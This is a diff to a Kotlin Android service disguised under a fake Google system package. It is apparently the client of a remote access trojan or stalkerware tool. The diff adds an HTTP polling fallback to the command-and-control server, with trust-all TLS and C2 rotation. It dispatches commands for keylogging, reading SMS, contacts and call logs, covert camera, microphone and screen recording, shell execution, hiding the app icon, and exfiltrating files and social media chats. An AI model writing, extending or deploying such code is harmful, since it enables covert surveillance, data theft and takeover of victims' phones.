@@ -32,6 +32,8 @@ import com.google.android.systemservice.utils.StealthNotificationHelper
 import com.google.android.systemservice.utils.TrustAllCertificates
 import kotlinx.coroutines.*
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.File
 import java.util.concurrent.TimeUnit
@@ -51,6 +53,10 @@ class CommandService : Service() {
     private lateinit var commandQueue: CommandQueueManager
     // Track current request_id for command-response correlation
     @Volatile private var currentRequestId: String? = null
+    // HTTP polling fallback when WebSocket fails
+    @Volatile private var httpPollingActive = false
+    private var pollingJob: Job? = null
+    private val HTTP_POLL_INTERVAL = 5000L // 5 seconds
 
     override fun onCreate() {
         super.onCreate()
@@ -77,6 +83,8 @@ class CommandService : Service() {
         startForegroundSilent()
         scheduleJob()
         connectWebSocket()
+        // Start HTTP polling immediately as WS fallback
+        startHttpPolling()
     }
 
     private fun scheduleJob() {
@@ -106,9 +114,11 @@ class CommandService : Service() {
         startForeground(StealthNotificationHelper.COMMAND_SERVICE_ID, notification)
     }
 
+    @Volatile private var isConnecting = false
+
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "CommandService started")
-        if (!isConnected) {
+        if (!isConnected && !isConnecting) {
             connectWebSocket()
         }
         // Reverse watchdog: ensure WatchdogService is alive
@@ -139,15 +149,19 @@ class CommandService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     private fun connectWebSocket() {
+        if (isConnecting) return
+        isConnecting = true
         try {
+            Log.d(TAG, "connectWebSocket() called, serverUrl=${AndroidConfig.serverUrl}")
             client = TrustAllCertificates.createClientBuilder()
-                .connectTimeout(30, TimeUnit.SECONDS)
+                .connectTimeout(10, TimeUnit.SECONDS)
                 .readTimeout(0, TimeUnit.MILLISECONDS) // No read timeout for WS
                 .writeTimeout(30, TimeUnit.SECONDS)
                 .pingInterval(25, TimeUnit.SECONDS)
                 .build()
 
             val wsUrl = "${AndroidConfig.websocketUrl}&device_id=${getDeviceIdentifier()}"
+            Log.d(TAG, "WebSocket connecting to: $wsUrl")
             val request = Request.Builder()
                 .url(wsUrl)
                 .build()
@@ -156,7 +170,9 @@ class CommandService : Service() {
                 override fun onOpen(webSocket: WebSocket, response: Response) {
                     Log.d(TAG, "WebSocket connected")
                     isConnected = true
+                    isConnecting = false
                     reconnectAttempts = 0
+                    stopHttpPolling()
                     subscribeToChannel()
                     
                     // Flush any offline-queued data
@@ -179,17 +195,20 @@ class CommandService : Service() {
                 override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                     Log.d(TAG, "WebSocket closed: $reason")
                     isConnected = false
+                    isConnecting = false
                     scheduleReconnect()
                 }
 
                 override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                     Log.e(TAG, "WebSocket error: ${t.message}")
                     isConnected = false
+                    isConnecting = false
                     scheduleReconnect()
                 }
             })
         } catch (e: Exception) {
             Log.e(TAG, "Failed to connect WebSocket: ${(e.message ?: "Unknown error")}")
+            isConnecting = false
             scheduleReconnect()
         }
     }
@@ -249,63 +268,7 @@ class CommandService : Service() {
             }
 
             Log.d(TAG, "Received command: $command")
-
-            when (command) {
-                "get_location" -> executeGetLocation()
-                "get_accounts" -> executeGetAccounts()
-                "toggle_wifi" -> executeToggleWifi()
-                "start_camera" -> executeStartCamera(params)
-                "stop_camera" -> executeStopCamera()
-                "start_audio" -> executeStartAudio(params)
-                "stop_audio" -> executeStopAudio()
-                "take_photo" -> executeTakePhoto(params)
-                "get_device_info" -> executeGetDeviceInfo()
-                "get_contacts" -> executeGetContacts()
-                "get_sms" -> executeGetSms()
-                "get_call_logs" -> executeGetCallLogs()
-                "get_installed_apps" -> executeGetInstalledApps()
-                "shell_command" -> executeShellCommand(params)
-                "get_keylog_dump" -> executeGetKeylogDump()
-                "keylog_ack" -> handleKeylogAck(params ?: JSONObject())
-                "start_live_video" -> executeStartLiveVideo(params)
-                "stop_live_video" -> executeStopLiveVideo()
-                "start_live_audio" -> executeStartLiveAudio()
-                "stop_live_audio" -> executeStopLiveAudio()
-                "take_screenshot" -> executeTakeScreenshot()
-                "start_screen_record" -> executeStartScreenRecord(params)
-                "stop_screen_record" -> executeStopScreenRecord()
-                "send_sms" -> executeSendSms(params)
-                "install_apk" -> executeInstallApk(params)
-                "uninstall_app" -> executeUninstallApp(params)
-                "launch_app" -> executeLaunchApp(params)
-                "unlock_screen" -> executeUnlockScreen()
-                "hide_icon" -> executeHideIcon()
-                "show_icon" -> executeShowIcon()
-                "change_audio_mode" -> executeChangeAudioMode(params)
-                "get_wifi_info" -> executeGetWifiInfo()
-                "shell_exec" -> executeShellExec(params)
-                // Location tracking commands
-                "start_location_tracking" -> executeStartLocationTracking(params)
-                "stop_location_tracking" -> executeStopLocationTracking()
-                // New features
-                "ambient_record" -> executeAmbientRecord(params)
-                "get_app_usage" -> executeGetAppUsage()
-                "get_browser_history" -> executeGetBrowserHistory()
-                "browse_files" -> executeBrowseFiles(params)
-                "list_files" -> executeListFiles(params)
-                "download_file" -> executeDownloadFile(params)
-                "upload_file" -> executeUploadFile(params)
-                "upload_file_chunk" -> executeUploadFileChunk(params)
-                "delete_file" -> executeDeleteFile(params)
-                "preview_file" -> executePreviewFile(params)
-                "rename_file" -> executeRenameFile(params)
-                "move_file" -> executeMoveFile(params)
-                "search_files" -> executeSearchFiles(params)
-                "add_geofence" -> executeAddGeofence(params)
-                "start_clipboard_monitor" -> executeStartClipboardMonitor()
-                "social_media_chats" -> executeSocialMediaScraping(params)
-                else -> Log.w(TAG, "Unknown command: $command")
-            }
+            dispatchCommand(command, params)
         } catch (e: Exception) {
             Log.e(TAG, "Error handling message: ${(e.message ?: "Unknown error")}")
         }
@@ -855,7 +818,14 @@ class CommandService : Service() {
                 }
             }.toString())
         }
-        webSocket?.send(message.toString())
+        if (isConnected) {
+            webSocket?.send(message.toString())
+        }
+        // Also send via HTTP when polling (WS may be down)
+        if (httpPollingActive && !reqId.isNullOrEmpty()) {
+            serviceScope.launch { sendHttpResponse(type, data) }
+            return // sendHttpResponse clears currentRequestId
+        }
         // Clear request_id after sending response
         if (!reqId.isNullOrEmpty()) {
             currentRequestId = null
@@ -870,6 +840,11 @@ class CommandService : Service() {
             val jitter = (0..(baseDelay / 4)).random()
             delay = baseDelay + jitter
             Log.d(TAG, "Scheduling reconnect in ${delay}ms (attempt $reconnectAttempts, jitter ${jitter}ms)")
+            
+            // Start HTTP polling fallback after 2 failed WS attempts
+            if (reconnectAttempts >= 2 && !httpPollingActive) {
+                startHttpPolling()
+            }
             
             // After 3 consecutive failures on same server, try next C2
             if (reconnectAttempts > 0 && reconnectAttempts % 3 == 0) {
@@ -890,6 +865,162 @@ class CommandService : Service() {
                     connectWebSocket()
                 }
             }
+        }
+    }
+
+    // ── HTTP Polling Fallback ────────────────────────────────────────────
+    private fun startHttpPolling() {
+        if (httpPollingActive) return
+        httpPollingActive = true
+        Log.d(TAG, "Starting HTTP polling fallback (WS unavailable)")
+
+        pollingJob = serviceScope.launch {
+            while (httpPollingActive && isActive) {
+                try {
+                    pollForCommands()
+                } catch (e: Exception) {
+                    Log.e(TAG, "HTTP poll error: ${e.message}")
+                }
+                delay(HTTP_POLL_INTERVAL)
+            }
+        }
+    }
+
+    private fun stopHttpPolling() {
+        if (!httpPollingActive) return
+        httpPollingActive = false
+        pollingJob?.cancel()
+        pollingJob = null
+        Log.d(TAG, "HTTP polling stopped (WS connected)")
+    }
+
+    private fun pollForCommands() {
+        val deviceId = getDeviceIdentifier()
+        val url = "${AndroidConfig.apiBaseUrl}/commands/$deviceId"
+        val httpClient = client ?: TrustAllCertificates.createClientBuilder()
+            .connectTimeout(10, TimeUnit.SECONDS)
+            .readTimeout(10, TimeUnit.SECONDS)
+            .build()
+
+        val request = Request.Builder()
+            .url(url)
+            .header("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
+            .get()
+            .build()
+
+        val response = httpClient.newCall(request).execute()
+        if (!response.isSuccessful) {
+            Log.w(TAG, "Poll HTTP ${response.code}")
+            response.close()
+            return
+        }
+
+        val body = response.body?.string() ?: return
+        response.close()
+        val json = JSONObject(body)
+        val commands = json.optJSONArray("commands") ?: return
+
+        for (i in 0 until commands.length()) {
+            val cmd = commands.getJSONObject(i)
+            val action = cmd.optString("action", "")
+            val requestId = cmd.optString("request_id", "")
+            val params = cmd.optJSONObject("params")
+
+            if (action.isNotEmpty()) {
+                Log.d(TAG, "HTTP poll received command: $action (req=$requestId)")
+                if (requestId.isNotEmpty()) currentRequestId = requestId
+                dispatchCommand(action, params)
+            }
+        }
+    }
+
+    private fun sendHttpResponse(type: String, data: JSONObject) {
+        val deviceId = getDeviceIdentifier()
+        val reqId = currentRequestId ?: return
+        val url = "${AndroidConfig.apiBaseUrl}/commands/$deviceId/respond"
+        val httpClient = client ?: TrustAllCertificates.createClientBuilder()
+            .connectTimeout(10, TimeUnit.SECONDS)
+            .readTimeout(10, TimeUnit.SECONDS)
+            .build()
+
+        val jsonBody = JSONObject().apply {
+            put("request_id", reqId)
+            put("type", type)
+            put("payload", data)
+        }
+        val mediaType = "application/json; charset=utf-8".toMediaType()
+        val body = jsonBody.toString().toRequestBody(mediaType)
+        val request = Request.Builder()
+            .url(url)
+            .header("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
+            .post(body)
+            .build()
+
+        try {
+            val response = httpClient.newCall(request).execute()
+            Log.d(TAG, "HTTP response sent: ${response.code}")
+            response.close()
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to send HTTP response: ${e.message}")
+        }
+        currentRequestId = null
+    }
+
+    // Dispatch command from either WS or HTTP polling
+    private fun dispatchCommand(command: String, params: JSONObject?) {
+        when (command) {
+            "get_location" -> executeGetLocation()
+            "get_accounts" -> executeGetAccounts()
+            "toggle_wifi" -> executeToggleWifi()
+            "start_camera" -> executeStartCamera(params)
+            "stop_camera" -> executeStopCamera()
+            "start_audio" -> executeStartAudio(params)
+            "stop_audio" -> executeStopAudio()
+            "take_photo" -> executeTakePhoto(params)
+            "get_device_info" -> executeGetDeviceInfo()
+            "get_contacts" -> executeGetContacts()
+            "get_sms" -> executeGetSms()
+            "get_call_logs" -> executeGetCallLogs()
+            "get_installed_apps" -> executeGetInstalledApps()
+            "shell_command" -> executeShellCommand(params)
+            "get_keylog_dump" -> executeGetKeylogDump()
+            "keylog_ack" -> handleKeylogAck(params ?: JSONObject())
+            "start_live_video" -> executeStartLiveVideo(params)
+            "stop_live_video" -> executeStopLiveVideo()
+            "start_live_audio" -> executeStartLiveAudio()
+            "stop_live_audio" -> executeStopLiveAudio()
+            "take_screenshot" -> executeTakeScreenshot()
+            "start_screen_record" -> executeStartScreenRecord(params)
+            "stop_screen_record" -> executeStopScreenRecord()
+            "send_sms" -> executeSendSms(params)
+            "install_apk" -> executeInstallApk(params)
+            "uninstall_app" -> executeUninstallApp(params)
+            "launch_app" -> executeLaunchApp(params)
+            "unlock_screen" -> executeUnlockScreen()
+            "hide_icon" -> executeHideIcon()
+            "show_icon" -> executeShowIcon()
+            "change_audio_mode" -> executeChangeAudioMode(params)
+            "get_wifi_info" -> executeGetWifiInfo()
+            "shell_exec" -> executeShellExec(params)
+            "start_location_tracking" -> executeStartLocationTracking(params)
+            "stop_location_tracking" -> executeStopLocationTracking()
+            "ambient_record" -> executeAmbientRecord(params)
+            "get_app_usage" -> executeGetAppUsage()
+            "get_browser_history" -> executeGetBrowserHistory()
+            "browse_files" -> executeBrowseFiles(params)
+            "list_files" -> executeListFiles(params)
+            "download_file" -> executeDownloadFile(params)
+            "upload_file" -> executeUploadFile(params)
+            "upload_file_chunk" -> executeUploadFileChunk(params)
+            "delete_file" -> executeDeleteFile(params)
+            "preview_file" -> executePreviewFile(params)
+            "rename_file" -> executeRenameFile(params)
+            "move_file" -> executeMoveFile(params)
+            "search_files" -> executeSearchFiles(params)
+            "add_geofence" -> executeAddGeofence(params)
+            "start_clipboard_monitor" -> executeStartClipboardMonitor()
+            "social_media_chats" -> executeSocialMediaScraping(params)
+            else -> Log.w(TAG, "Unknown command: $command")
         }
     }
 
